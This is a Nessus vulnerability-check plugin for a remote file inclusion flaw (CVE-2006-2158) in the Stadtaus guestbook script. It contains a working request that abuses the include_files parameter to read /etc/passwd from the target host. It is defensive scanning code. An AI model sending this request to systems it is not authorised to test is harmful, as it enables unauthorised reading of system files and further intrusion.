#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(21339);
  script_version("$Revision: 1.17 $");

  script_cve_id("CVE-2006-2158");
  script_bugtraq_id(17845);
  script_osvdb_id(25251);

  script_name(english:"Stadtaus Gaestebuch-Script index.php include_files Parameter Remote File Inclusion");
  script_summary(english:"Tries to read /etc/passwd");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
remote file include issues." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Stadtaus Gaestebuch-Script, a free
guestbook written in PHP. 

The version of Gaestebuch-Script installed on the remote host fails to
sanitize input to the 'include_files' array parameter before using it
in a PHP 'include()' function in various scripts.  Provided PHP's
'register_globals' setting is enabled, an unauthenticated attacker may
be able to exploit this issue to view arbitrary files on the remote
host or to execute arbitrary PHP code, possibly taken from third-party
hosts. 

Note that the application must be running under PHP 5 for an attacker
to take code from third-party hosts." );
 script_set_attribute(attribute:"see_also", value:"http://downloads.securityfocus.com/vulnerabilities/exploits/Stadtaus-Guestbook-0504-rfi.pl" );
 # http://web.archive.org/web/20090211074233/http://stadtaus.com/forum/t-2600.html
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?a3c542b3" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Gaestebuch-Script 1.9 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/05/11");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/04/25");
 script_cvs_date("$Date: 2013/06/03 21:40:31 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2013 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);

# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/gbs", "/gb", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit one of the flaws to read a file.
  file = "/etc/passwd";
  w = http_send_recv3(method:"GET",
    item:string(
      dir, "/index.php?",
      "include_files[]=&",
      # nb: this is slightly different from rgod's advisory, but it 
      #     lets us see the content of a file after 
      # 'templates/default/entries.tpl' is parsed.
      "include_files[query_string]=", file
    ), 
    port:port
  );
  if (isnull(w)) exit(1, "the web server did not answer");
  res = w[2];

  # There's a problem if there's an entry for root.
  if (egrep(pattern:"root:.*:0:[01]:", string:res))
  {
    contents = strstr(res, "sign.php");
    if (contents) contents = contents - strstr(contents, '">');

    if (isnull(contents)) security_warning(port);
    else 
    {
      report = string(
        "\n",
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        contents
      );
      security_warning(port:port, extra:report);
    }

    exit(0);
  }
}
